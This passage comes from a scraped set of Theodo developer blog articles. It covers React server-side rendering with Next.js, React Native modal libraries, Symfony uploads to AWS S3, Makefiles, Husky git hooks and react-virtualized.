require('path');\r\n\r\n// initialize the application and create the routes\r\nconst app = express();\r\nconst router = express.Router();\r\n\r\n// root (/) should always serve our server rendered page\r\nrouter.use('^/$', serverRenderer);\r\n\nTo render our html, we use a server renderer that is replacing the root component with the built html:\n// index.html file created by create-react-app build tool\r\nconst filePath = path.resolve(__dirname, '..', '..', 'build', 'index.html');\r\n\r\nfs.readFile(filePath, 'utf8', (err, htmlData) => {\r\n  // render the app as a string\r\n  const html = ReactDOMServer.renderToString(<App />);\r\n\r\n  // inject the rendered app into our html\r\n  return res.send(\r\n    htmlData.replace(\r\n      '<div id=\"root\"></div>',\r\n      `<div id=\"root\">${html}</div>`\r\n    )\r\n  );\r\n}\r\n\nThis is possible thanks to\u00a0ReactDOMServer.renderToString\u00a0which fully renders the HTML markup of a page to a string.\nWe finally need an entry point that will tell Node how to interpret our React JSX code. We achieve this with Babel.\nrequire('babel-register')({\r\n  ignore: [ /(node_modules)/ ],\r\n  presets: ['es2015', 'react-app']\r\n});\r\n\nTest it by yourself\n\ncheckout last changes on master branch\ninstall the dependencies with\u00a0yarn\nbuild the application with\u00a0yarn build\ndeclare babel environment in your terminal:\u00a0export BABEL_ENV=development\nlaunch your node server with\u00a0node server/bootstrap.js\nbrowse to\u00a0http://localhost:3001\u00a0to view the app\n\nStill simulating the \u20183G network\u2019 in Chrome, here is the result:\n\nDo not be mistaken, the page is rendered by server. But as soon as the javascript is fully loaded, window.document is available and the\u00a0isClientOrServer()\u00a0function returns\u00a0client.\nWe proved that we can do Server-side Rendering, but what\u2019s going on\u00a0with that React logo?!\nWe\u2019re missing many features\nOur example is a good proof of concept but very limited. We would like to see more features like:\n\nimport images in js files (logo problem)\nseveral routes usage or route management (check\u00a0this article)\ndeal with the\u00a0</head>\u00a0and the metatags (for SEO improvements)\ncode splitting (here is\u00a0an article\u00a0solving the problem)\nmanage the state of our app or use Redux (check this\u00a0great article\n\nand performance is bad on large pages:\u00a0ReactDOMServer.renderToString()\u00a0is a synchronous CPU bound call and can starve out incoming requests to the server. Walmart worked on\u00a0an optimization\u00a0for their e-commerce website.\nIt is possible to make Server-side Rendering\u00a0work perfectly on top of create-react-app, we won\u2019t go through all the painful work in this article. Still, if you\u2019re interested in it, I attached just above some great articles giving detailed explanations.\nSeriously\u2026 Next.js can bring you all these features!\n2) Next.js helps you building server rendered React.js Application\n\nWhat is Next.js?\nNext.js is a minimalistic framework for server-rendered React applications with:\n\na very simple page based routing\nWebpack hot reloading\nautomatic transpilation (with babel)\ndeployment facilities\nautomatic code splitting (loads page faster)\nbuilt in css support\nability to run server-side actions\nsimple integration with Redux using next-redux-wrapper.\n\nGet started in 1 minute\nIn this short example, we are going to see how crazy simple it is to have a server-side rendering app ready with Next.js.\nFirst, generate your package.json with\u00a0npm init\u00a0and install Next.js with\u00a0npm install --save next react react-dom. Then, add a script to your package.json like this:\n\"scripts\": {\r\n  \"dev\": \"next\",\r\n  \"build\": \"next build\",\r\n  \"start\": \"next start\"\r\n}\r\n\nCreate a pages/ folder. Every .js file becomes a route that gets automatically processed and rendered. Add a index.js file in that pages/ folder (with the execution of our\u00a0isClientOrServer\u00a0function):\nconst Index = ({ title = 'Hello from Next.js' }) => (\r\n  <div>\r\n    <h1>{title}</h1>\r\n    <p className=\"App-intro\">\r\n      Is my application rendered by server or client?\r\n    </p>\r\n    <h2><code>{isClientOrServer()}</code></h2>\r\n  </div>\r\n);\r\n\r\nexport default Index;\r\n\nNo need to import any library at the top of our index.js file, Next.js already knows that we are using React.\nNow enter\u00a0npm run dev\u00a0into your terminal and go to\u00a0http://localhost:3000: Tadaaaaa!\n\nRepeat the same operation inside your pages/ folder to create a new page. The url to access it will directly match the name you give to the file.\nYou\u2019re ready to go! You\u2019re already doing SSR. Check the\u00a0documentation on Next.js\u00a0official repository.\nUse create-next-app\nYou want to start a server-side rendered React app, you can now stop using create-react-app, and start using\u00a0create-next-app:\nnpm install -g create-next-app\r\n\r\ncreate-next-app my-app\r\ncd my-app/\r\nnpm run dev\r\n\nThis is all you need to do to create a React app with server-side rendering thanks to Next.js.\nFinally, better than a simple Hello World app, check this\u00a0Hacker News clone\u00a0implementing Next.js. It is fully server-rendered, queries the data over Firebase and updates in realtime as new votes come in.\nVue.js and Nuxt\nYou\u2019re maybe a Vue.js developer. Just after Next.js first release, two french brothers made the same for Vue.js: Nuxt was born! Like Vue, the Nuxt documentation is very clear and you can use the same starter template\u00a0vue-cli\u00a0for you app:\n vue init nuxt-community/starter-template <project-name> \nWhat\u2019s Next? \nHope you liked this article which was mainly written in order to introduce server-side rendering with Next.\nIf you are interested in server-side rendering for your existing React application, in the following, I am going to demonstrate how to migrate your existing create-react-app to Next.js. Coming soon\u2026\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBaptiste Jan\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer @Theodo. I like Vue.js and all the ecosystem growing around.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAt some point during the development of your React Native application, you will use a Modal. A Modal is a component that appears on top of everything.\nThere are a lot of cool libraries out there for modals, so today, we\u2019ll have a look a the best libraries for different use cases.\nClick on \u201cTap to play\u201d on the playground below to start:\n\n\nYou can experience the app on your phone here and check the code on github.\nBefore choosing a library, you have to\u00a0answer those\u00a02 questions:\n\nWhat do I want to display in the modal ?\nHow great do I want the UX to be ?\n\nTo answer the 2nd question, we list a few criteria that make a good UX :\n1\ufe0f\u20e3 The user can click on a button to close the modal\n2\ufe0f\u20e3 The user can touch the background to close the modal\n3\ufe0f\u20e3 The user can swipe the modal to close it\n4\ufe0f\u20e3 The user can scroll inside the modal\nI)\u00a0Alert\nFirst, if you\u00a0simply want to display some information and perform an action based on\u00a0the decision of your user, you should probably go with a\u00a0native Alert. An alert is enough and provides a much simpler and more expected UX. You can see how it will look like below.\n\nII) Native modal\nIf you want to show more information to your user, like a picture or a customised button, you need a Modal. The simplest modal is the React Native modal. It gives you the bare properties to show and close the modal 1\ufe0f\u20e3, so it is really easy to use \u2705. The downside is that it requires some effort to customise so as to improve the user experience \u274c.\n\r\nimport { Modal } from \"react-native\";\r\n...\r\n        <Modal\r\n          animationType=\"slide\"\r\n          transparent={true}\r\n          visible={this.state.modalVisible}\r\n          onRequestClose={this.closeModal} // Used to handle the Android Back Button\r\n        >\r\n\nIII) Swipeable Modal\nIf you want to improve the UX, you can allow the user to swipe the modal away. For example, if the modal comes from the top like a notification, it feels natural to close it by pulling it up \u2b06\ufe0f. If it comes from the bottom, the user will be surprised if they cannot swipe it down \u2b07\ufe0f. It\u2019s even better to highlight the fact that they can swipe the modal with a little bar with some borderRadius. The best library for that use case would be the react-native-modal library. It is widely customisable and answers to criteria 1\ufe0f\u20e3, 2\ufe0f\u20e3 and 3\ufe0f\u20e3.\n\r\nimport Modal from \"react-native-modal\";\r\n...\r\n        <Modal\r\n          isVisible={this.state.visible}\r\n          backdropOpacity={0.1}\r\n          swipeDirection=\"left\"\r\n          onSwipe={this.closeModal}\r\n          onBackdropPress={this.closeModal}\r\n        >\r\n\nIV) Scrollable modal\nSo far so good, now let\u2019s see some more complex use cases. For instance, you may want the content of the modal to be scrollable (if you are displaying a lot of content or a Flatlist). The scroll may conflict with either the scroll of the modal or the scroll of the container of the Modal, if it is a scrollable component. For this use case, you can still use the react-native-modal library. You will have 1\ufe0f\u20e3, 2\ufe0f\u20e3 and 4\ufe0f\u20e3. You can control the direction of the swipe with\u2026 swipeDirection.\n\r\nimport Modal from \"react-native-modal\";\r\n...\r\n        <Modal\r\n          isVisible={this.state.visible}\r\n          backdropOpacity={0.1}\r\n          onSwipe={this.closeModal}\r\n          // swipeDirection={\"left\"} <-- We can't specify swipeDirection since we want to scroll inside the modal\r\n          onBackdropPress={this.closeModal}\r\n        >\r\n\n\u26a0\ufe0f Don\u2019t try to combine swipeable + scrollable with this library. Instead continue reading\u2026\nV) Swipeable + Scrollable modal\nThe previous libraries are already awesome, but if you want your modal to answer criteria 1\ufe0f\u20e3, 2\ufe0f\u20e3, 3\ufe0f\u20e3and 4\ufe0f\u20e3, you need\u00a0react-native-modalbox. This library is still very easy to use \u2705and has everything out of the box \u2705, and is listed in the awesome libraries by awesome-react-native. The only downside is that the modal from this library always appear from the bottom, and you can only swipe it down \u274c.\n\r\nimport Modal from \"react-native-modalbox\";\r\n...\r\n        <Modal\r\n          style={styles.container}\r\n          swipeToClose={true}\r\n          swipeArea={20} // The height in pixels of the swipeable area, window height by default\r\n          swipeThreshold={50} // The threshold to reach in pixels to close the modal\r\n          isOpen={this.state.isOpen}\r\n          onClosed={this.closeModal}\r\n          backdropOpacity={0.1}\r\n        >\r\n\nTo avoid the collision between the scroll of your content and the swipe to close the modal, you have to specify swipeArea and swipeThreshold.\nConclusion\nThere are a lot of libraries built on top of the native modal. It is important to choose the right one depending on your needs. If you want to control the direction of the swipe, use react-native-modal, but if you want the modal to only come from the bottom, use react-native-modalbox.\nThe libraries I\u2019ve talked about are amazing. Thanks to their contributors.\n\nPlease reach out if you think I missed something.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Garcia\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy?\nAdding upload fields in Symfony application eases the way of managing assets. It makes it possible to upload public assets as well as sensitive documents instantly without any devops knowledge. Hence, I\u2019ll show you a way of implementing a Symfony / Amazon AWS architecture to store your documents in the cloud.\nSetup Symfony and AWS\nFirst you need to setup both Symfony and AWS to start storing some files from Symfony in AWS buckets.\nAmazon AWS\nCreating a bucket on Amazon AWS is really straight forward. First you need to sign up on Amazon S3 (http://aws.amazon.com/s3). Go to the AWS console and search S3. Then click on Create a bucket.\nFollow bucket creation process choosing default values (unless you purposely want to give public access to your documents, you should keep your bucket private). Eventually create a directory for each of your environments. Your AWS S3 bucket is now ready to store your documents.\nSymfony\nNow you need to setup Symfony to be able to store files and to communicate with Amazon AWS. You will need 2 bundles and 1 SDK to set it up:\n\nVichUploader (a bundle that will ease files upload)\nKNP/Gauffrette (a bundle that will provide an abstraction layer to use uploaded files in your Symfony application without requiring to know where those files are actually stored)\nAWS-SDK (A SDK provided by Amazon to communicate with AWS API)\n\nInstall the two bundles and the SDK with composer:\n\r\ncomposer require vich/uploader-bundle\r\ncomposer require aws/aws-sdk-php\r\ncomposer require knplabs/knp-gaufrette-bundle\r\n\r\n\nThen register the bundles in AppKernel.php\n\r\npublic function registerBundles()\r\n    {\r\n     return [\r\n            \tnew Vich\\UploaderBundle\\VichUploaderBundle(),\r\n            \tnew Knp\\Bundle\\GaufretteBundle\\KnpGaufretteBundle(),\r\n            ];\r\n    }\r\n\r\n\nBucket parameters\nIt is highly recommended to use environment variables to store your buckets parameters and credentials. It will make it possible to use different buckets depending on your environment and will prevent credentials from being stored in version control system. Hence, you won\u2019t pollute your production buckets with test files generated in development environment.\nYou will need to define four parameters to get access to your AWS bucket:\n\nAWS_BUCKET_NAME\nAWS_BASE_URL\nAWS_KEY (only for and private buckets)\nAWS_SECRET_KEY (only for and private buckets)\n\nYou can find the values of these parameters in your AWS console.\nConfiguration\nYou will have to define a service extending Amazon AWS client and using your AWS credentials.\nAdd this service in services.yml:\n\r\nct_file_store.s3:\r\n        class: Aws\\S3\\S3Client\r\n        factory: [Aws\\S3\\S3Client, 'factory']\r\n        arguments:\r\n            -\r\n                version: YOUR_AWS_S3_VERSION (to be found in AWS console depending on your bucket region and version)\r\n                region: YOUR_AWS_S3_REGION\r\n                credentials:\r\n                    key: '%env(AWS_KEY)%'\r\n                    secret: '%env(AWS_SECRET)%'\r\n\r\n\nNow you need to configure VichUploader and KNP_Gaufrette in Symfony/app/config/config.yml. Use the parameters previously stored in your environment variables.\nHere is a basic example:\n\r\nknp_gaufrette:\r\n    stream_wrapper: ~\r\n    adapters:\r\n        document_adapter:\r\n            aws_s3:\r\n                service_id: ct_file_store.s3\r\n                bucket_name: '%env(AWS_BUCKET)%'\r\n                detect_content_type: true\r\n                options:\r\n                    create: true\r\n                    directory: document\r\n    filesystems:\r\n        document_fs:\r\n            adapter:    document_adapter\r\n\r\nvich_uploader:\r\n    db_driver: orm\r\n    storage: gaufrette\r\n    mappings:\r\n        document:\r\n            inject_on_load: true\r\n            uri_prefix: \"%env(AWS_BASE_URL)%/%env(AWS_BUCKET)%/document\"\r\n            upload_destination: document_fs\r\n            delete_on_update:   false\r\n            delete_on_remove:   false \r\n\r\n\nUpload files\nFirst step in our workflow is to upload a file from Symfony to AWS. You should create an entity to store your uploaded document (getters and setters are omitted for clarity, you will need to generate them).\nThe attribute mapping in $documentFile property annotation corresponds to the mapping defined in config.yml. Don\u2019t forget the class attribute @Vich\\Uploadable().\n\r\nnamespace MyBundle\\Entity;\r\n\r\nuse Doctrine\\ORM\\Mapping as ORM;\r\nuse Symfony\\Component\\HttpFoundation\\File\\File;\r\nuse Vich\\UploaderBundle\\Mapping\\Annotation as Vich;\r\n\r\n/**\r\n * Class Document\r\n *\r\n * @ORM\\Table(name=\"document\")\r\n * @ORM\\Entity()\r\n * @Vich\\Uploadable()\r\n */\r\nclass Document\r\n{\r\n    /**\r\n     * @var int\r\n     *\r\n     * @ORM\\Column(type=\"integer\", name=\"id\")\r\n     * @ORM\\Id\r\n     * @ORM\\GeneratedValue(strategy=\"AUTO\")\r\n     */\r\n    private $id;\r\n\r\n    /**\r\n     * @var string\r\n     *\r\n     * @ORM\\Column(type=\"string\", length=255, nullable=true)\r\n     */\r\n    private $documentFileName;\r\n\r\n    /**\r\n     * @var File\r\n     * @Vich\\UploadableField(mapping=\"document\", fileNameProperty=\"documentFileName\")\r\n     */\r\n    private $documentFile;\r\n\r\n    /**\r\n     * @var \\DateTime\r\n     *\r\n     * @ORM\\Column(type=\"datetime\")\r\n     */\r\n    private $updatedAt;\r\n}\r\n\r\n\nThen you can add an uploaded document to any of your entities:\n\r\n     /**\r\n     * @var Document\r\n     *\r\n     * @ORM\\OneToOne(\r\n     *     targetEntity=\"\\MyBundle\\Entity\\Document\",\r\n     *     orphanRemoval=true,\r\n     *     cascade={\"persist\", \"remove\"},\r\n     * )\r\n     * @ORM\\JoinColumn(name=\"document_file_id\", referencedColumnName=\"id\", onDelete=\"SET NULL\")\r\n     */\r\n    private $myDocument;\r\n\r\n\nCreate a form type to be able to upload a document:\n\r\nclass UploadDocumentType extends AbstractType\r\n{\r\n    public function buildForm(FormBuilderInterface $builder, array $options)\r\n    {\r\n        add('myDocument', VichFileType::class, [\r\n                'label'         => false,\r\n                'required'      => false,\r\n                'allow_delete'  => false,\r\n                'download_link' => true,\r\n            ]);\r\n    }\r\n...\r\n}\r\n\r\n\nUse this form type in your controller and pass the form to the twig:\n\r\n...\r\n$myEntity = new MyEntity();\r\n$form = $this->createForm(UploadDocumentType::class, $myEntity);\r\n...\r\nreturn [ 'form' => $form->createView()];\r\n\r\n\nFinally, add this form field in your twig and you should see an upload field in your form:\n\r\n<div class=\"row\">\r\n    <div class=\"col-xs-4\">\r\n        {{ form_label(form.myDocument) }}\r\n    </div>\r\n    <div class=\"col-xs-8\">\r\n        {{ form_widget(form.myDocument) }}\r\n    </div>\r\n    <div class=\"col-xs-8 col-xs-offset-4\">\r\n        {{ form_errors(form.myDocument) }}\r\n    </div>\r\n</div>\r\n\r\n\nNavigate to your page, upload a file and submit your form. You should now be able to see this document in your AWS bucket.\nUsers are now able to upload files on your Symfony application and these documents are safely stored on Amazon AWS S3 bucket. The next step is to provide a way to download and display these documents from AWS in your Symfony application.\nDisplay or download documents stored in private buckets\nIn most cases, your files are stored in private buckets. Here is a step by step way to safely give access to these documents to your users.\nGet your document from private bucket\nYou will need a method to retrieve your files from your private bucket and display it on a custom route. As a result, users will never see the actual route used to download the file. You should define this method in a separate service and use it in the controller.\ns3PrivateClient is the service we defined previously extending AWS S3 client. You will need to inject your bucket name from your environment variables in this service. my-documents/ is the folder you created to store your documents.\n\r\n     /**\r\n     * @param string $documentName\r\n     *\r\n     * @return \\Aws\\Result|bool\r\n     */\r\n    public function getDocumentFromPrivateBucket($documentName)\r\n    {\r\n        try {\r\n            return $this->s3PrivateClient->getObject(\r\n                [\r\n                    'Bucket' => $this->privateBucketName,\r\n                    'Key'    => 'my-documents/'.$documentName,\r\n                ]\r\n            );\r\n        } catch (S3Exception $e) {\r\n            // Handle your exception here\r\n        }\r\n    }\r\n\r\n\nDefine an action with a custom route:\nYou will need to use the method previously defined to download the file from AWS and expose it on a custom route.\n\r\n     /**\r\n     * @param Document $document\r\n     * @Route(\"/{id}/download-document\", name=\"download_document\")\r\n     * @return RedirectResponse|Response\r\n     */\r\n    public function downloadDocumentAction(Document $document)\r\n    {\r\n        $awsS3Uploader  = $this->get('app.service.s3_uploader');\r\n\r\n        $result = $awsS3Uploader->getDocumentOnPrivateBucket($document->getDocumentFileName());\r\n\r\n        if ($result) {\r\n            // Display the object in the browser\r\n            header(\"Content-Type: {$result['ContentType']}\");\r\n            echo $result['Body'];\r\n\r\n            return new Response();\r\n        }\r\n\r\n        return new Response('', 404);\r\n    }\r\n\r\n\nDownload document\nEventually add a download button to access a document stored in a private bucket directly in your Symfony application.\n\r\n<a href=\"{{ path('/download-document', {'id': document.id}) }}\" \r\n                   target=\"_blank\">\r\n   <i class=\"fa fa-print\">\r\n   {{ 'label_document_download'|trans }}\r\n</a>\r\n\r\n\nPublic assets\nYou may want to display some assets from Amazon AWS in public pages of your application. To do so, use a public bucket to upload these assets. It is quite straight forward to access it to display them. Be conscious that anyone will be able to access these files outside your application.\n\r\n<img src=\"{{ vich_uploader_asset(myEntity.myDocument, 'documentFile') }}\" alt=\"\" />\r\n\r\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlan Rauzier\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tFor one of Theodo\u2019s clients, we built a complex website including a catalog, account management and the availability to order products.\nAs a result, the project was complex, with several languages (symfony, vue, javascript), utilities (docker, aws, webpack) and microservices (for the search of products, the management of accounts, the orders).\nThe impact of this complexity for the development teams was the numerous commands they had to use every day, and particularly to install the project.\nThus, and following Symfony 4 best practices, we decided to use make\u00a0on the project to solve these problems.\nAnd it worked!\nWhat is make\nMake is a build automation tool created in 1976, designed to solve dependency problems of the build process.\nIt was originally used to get compiled files from source code, for instance for C language.\nIn website development, an equivalent could be the installation of a project and its dependencies from the source code.\nLet me introduce a few concepts about make that we will need after.\nMake reads a descriptive file called Makefile, to build a target, executing some commands, and depending on a prerequisite.\nThe architecture of the Makefile is the following:\n\r\ntarget: [prerequisite]\r\n    command1\r\n    [command2]\r\n\nAnd you run make target in your terminal to execute the target\u00a0commands. Simple, right?\nUse it for project installation\nWhat is mainly used to help project installation is a README describing the several commands you need to run to get your project installed.\nWhat if all these commands were executed by running make install?\nYou would have your project working with one command, and no documentation to maintain anymore.\nI will only describe a simple way to build dependencies from your composer.json file\n\r\nvendor: composer.json\r\n    composer install\r\n\nThis snippet will build the vendor directory, running composer install, only if the vendor directory does not exist. Or if composer.json file has changed since the last time you built the vendor directory.\nNote that if you don\u2019t want to check the existency of a directory or a file named as your target, you can use a Phony Target. It means adding the line .PHONY: target to your Makefile.\nThere is much more you can do, and I won\u2019t talk about it here.\nBut if you want a nice example to convert an installation README\u00a0into a Makefile, you can have a look at these slides,\u00a0that are coming from a talk at Paris Symfony Live 2018.\nUse it for the commonly used commands you need on your project\nAfter the project installation, a complexity for the developer is to find the commands needed to develop features locally.\nWe decided to create a Makefile\u00a0to gather all the useful commands we use in the project on a daily basis.\nWhat are the advantages of this:\n\nThe commands are committed and versioned\nAll developers of the team are using the same, reviewed commands. -> there is no risk to forget one thing before executing a command line and break something\nIt is language agnostic -> which means you can start php jobs, javascript builds, docker commands, \u2026\nIt\u2019s well integrated with the OS -> for instance there is autocompletion for targets and even for options\nYou can use it for continuous improvement -> when a command fails for one dev, modify that command and commit the new version. It will never fail anymore!\n\nAuto-generate a help target\nBut after a long time, we started having a lot of commands.\nIt was painful to find the one you wanted in the file, and even to know the one that existed\nSo we added a new target help, in order to automatically generate a list of available commands from the comments in the Makefile.\nThe initial snippet we used is:\n\r\n.DEFAULT_GOAL := help\r\nhelp:\r\n    @grep -E '(^[a-zA-Z_-]+:.*?##.*$$)|(^##)' $(MAKEFILE_LIST) | awk 'BEGIN {FS = \":.*?## \"}{printf \"\\033[32m%-30s\\033[0m %s\\n\", $$1, $$2}' | sed -e 's/\\[32m##/[33m/'\r\n\nIf you add the following target and comments in your Makefile:\n\r\n## Example section\r\nexample_target: ## Description for example target\r\n        @does something\r\n\nIt would give this help message:\n\nThis generic, reusable snippet has another advantage: the documentation it generates is always up to date!\nAnd you can customize it to your need, for instance to display options associated to your commands.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMartin Guillier\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\ttl:dr\nTo add a pre-commit git hook with Husky:\n\nInstall Husky with npm install husky --save-dev\nSet the pre-commit command in your package.json:\n\n\"scripts\": {\r\n    \"precommit\": \"npm test\"\r\n},\r\n\nWhat are git hooks?\nGit hooks are scripts launched when carrying out some git actions. The most common one is the pre-commit hook that\u00a0runs when performing git commit, before the commit is actually created.\nThe scripts are located in the .git/hooks folder. Check out the\u00a0.sample file examples in your local git repository.\n\nWhy do I need to install the Husky\u00a0package then?\nThe problem with git hooks is that they are in the .git directory, which means that they are not committed hence not shared between developers.\nHusky takes care of this: when a developer runs npm install, it will automatically create the scripts in .git/hooks:\n\nTheses scripts will parse your package.json and run the associated command. For example, the pre-commit script will run the npm run precommit command\n\"scripts\": {\r\n    \"precommit\": \"npm test\"\r\n},\r\n\nTo add husky to your project, simply run npm install husky --save-dev.\nFor more complex commands, I recommend to use a separate bash script :\u00a0\"precommit\": \"bash ./scripts/check-lint.sh\".\nEnhancing your git flow\nGit hooks are a convenient way to automate tasks during your git flow and protect you from pushing unwanted code by mistake.\n\nCheck for linting errors\n\nIf you have tools to check the code quality or formatting, you can run it on a pre-commit hook:\n\"scripts\": {\r\n    \"precommit\": \"prettier-check \\\"**/*.js\\\" && eslint . --quiet\"\r\n},\r\n\nI advise to run those tests on your CI tool as well, but checking it on a precommit hook can make you\u00a0save a lot of time as you won\u2019t have to wait for your CI to set up your whole project and fail only because you forgot a\u00a0semicolon.\n\nProtect important branches\n\nIn some rare situations, you have to push code directly on a branch that is deployed. One way to protect\u00a0it from developers in a hurry who forget to run the tests locally is to launch them on a pre-push hook:\n\"scripts\": {\r\n    \"prepush\": \"./scripts/pre-push-check.sh\"\r\n},\r\n\n\n#!/bin/bash\r\nset -e\r\n\r\nbranch=$(git branch | sed -n -e 's/^\\* \\(.*\\)/\\1/p')\r\nif [ \"$branch\" == \"master\" ]\r\nthen\r\n    npm test\r\nfi\r\n\n\nIf your tests fail, the code won\u2019t be pushed.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tHugo Lime\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo.\r\n\r\nPassionate about new technologies to make web apps stronger and faster.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy\nWhat is a Virtual DOM ?\nThe virtual DOM (VDOM) is a programming concept where an ideal, or \u201cvirtual\u201d, representation of a UI is kept in memory.\nThen, it is\u00a0synced with the \u201creal\u201d DOM by a library such as ReactDOM. This process is called\u00a0reconciliation.\nPerformance\u00a0and\u00a0windowing\nYou might know that React uses this virtual DOM. Thus, it is only when React renders elements that the user will have them into his/her HTML DOM.\nSometimes you might want to display a lot of html elements, like for grids,\u00a0lists, calendars, dropdowns etc and the user will often complain about performance.\n\nHence, a good way\u00a0to display a lot of information is to \u2018window\u2019\u00a0it. The idea is to create only elements the user can see. An example is the Kindle vs Book. While the book is a heavy object because it \u2018renders\u2019 all the pages, the Kindle only display what the user can see.\nReact-Virtualized\nThat is how Brian Vaughn came up with the idea of creating React-Virtualized.\nIt is an open-source library which provides you many components in order to window some of your application List, Grid etc\nAs a developer, you do not want to reinvent the wheel. React-virtualized is a stable and maintained library. Its community is large and as it is open-source, many modules and extensions are already available in order to window a maximum of elements.\nFurthermore, it offers lots of functionalities and customization that you would not even think about.\nWe will discuss about it later, but before, let\u2019s see when to use React-virtualized.\nWhen\nWhen thinking about performance, lots of actions can be taken, but\u00a0React official website\u00a0already got a complete article to be read. In consequence, if you face a performance problem, be sure you have already done all of these before to start to window your application (but stay pragmatic).\nHow\nGetting into it\nOk, now that you\u2019re convinced, let\u2019s go throught the real part.\n\nYou can begin by following instructions for installing the right package via npm and look at simple examples here : React virtualized github.\u00a0However,\u00a0I\u2019m going to show you a complex example so you can use React-Virtualized in an advanced way.\nReact-Virtualized 101\nTo render a windowed list, no need for digging one hour a complex documentation, React-Virtualized is very simple to use.\nFirstly, you use the List component from the library, then, the few important props are the next one:\n\nwidth: the width of the List\nheight: the height of the List\nrowCount: the number of elements you will display\nrowHeight: the height of each row you will display\nrowRenderer: a callback method to define yourself depending on what you want to do with your data. This method is the core of your list, it is here that you define what will be rendered thanks to your data.\n\nThe example\n\r\nimport React from 'react';\r\nimport { List } from 'react-virtualized';\r\n\r\n// List data as an array of strings\r\nconst list = [\r\n 'Easy windowing1',\r\n 'Easy windowing2',\r\n // And so on...\r\n];\r\n\r\nfunction rowRenderer({\r\n key, // Unique key within array of rows\r\n index, // Index of row within collection\r\n isScrolling, // Used for performance\r\n isVisible, // Used for performancee\r\n style, // Style object to be applied to row (to position it)\r\n}) {\r\n return (\r\n\r\n<div key={key} style={style}>\r\n   {list[index]}\r\n </div>\r\n\r\n );\r\n}\r\n\r\n// Render your list\r\nconst ListExample = () => (\r\n <List width={300} height={300} rowCount={list.length} rowHeight={20} rowRenderer={rowRenderer} />\r\n);\r\n\nClick here to see a demo\nA more complex virtualized list:\nDisplay a virtualized list might be easy, but you might have a complicated behaviour to implement.\n\nIn this advanced example, we will:\n\nUse the AutoSizer HOC to automatically calculate the size the List will fill\nBe able to display row with a dynamic height using the CellMeasurer\nBe able to use the CellMeasurer even if the data are not static\n\nThis advanced example goes through 4 steps:\n\nInstantiate the AutoSizer and List component\nSee how the CellMeasurer and the CellMeasurerCache work\nLearn how we use them in the rowRenderer\nGo further with using these on a list that does not contain a stable number of elements\n\nThe example\nLet\u2019s look first at how we render the list:\n\u00a0\n\r\nimport {\r\n AutoSizer,\r\n List,\r\n CellMeasurer,\r\n CellMeasurerCache,\r\n} from 'react-virtualized';\r\n...\r\n<AutoSizer>\r\n {({ height, width }) => (\r\n  <List\r\n    width={width}\r\n    height={height}\r\n    rowGetter={({ index }) => rows[index]}\r\n    rowCount={1000}\r\n    rowHeight={40}\r\n    rowRenderer={this.rowRenderer}\r\n    headerHeight={20}\r\n  />\r\n )}\r\n</AutoSizer>\r\n\nIt is very simple:\n\nWe wrap the list with the AutoSizer HOC\nIt uses the CellMeasurerCache to know the height of each row and the rowRenderer to render the elements.\n\nHow it works :\nFirst, you instantiate a new CellMeasurerCache that will contain all the calculated heights :\n\r\nconstructor(props) {\r\n super(props);\r\n this.cache = new CellMeasurerCache({ //Define a CellMeasurerCache --> Put the height and width you think are the best\r\n defaultHeight: 80,\r\n minHeight: 50,\r\n fixedWidth: true,\r\n });\r\n}\r\n\nThen, you use the CellMeasurer in the rowRenderer method:\n\r\nrowRenderer = ({\r\n   key, // Unique key within array of rows\r\n   index, // Index of row within collection\r\n   parent,\r\n   isScrolling, // The List is currently being scrolled --> Important if you need some perf adjustment\r\n   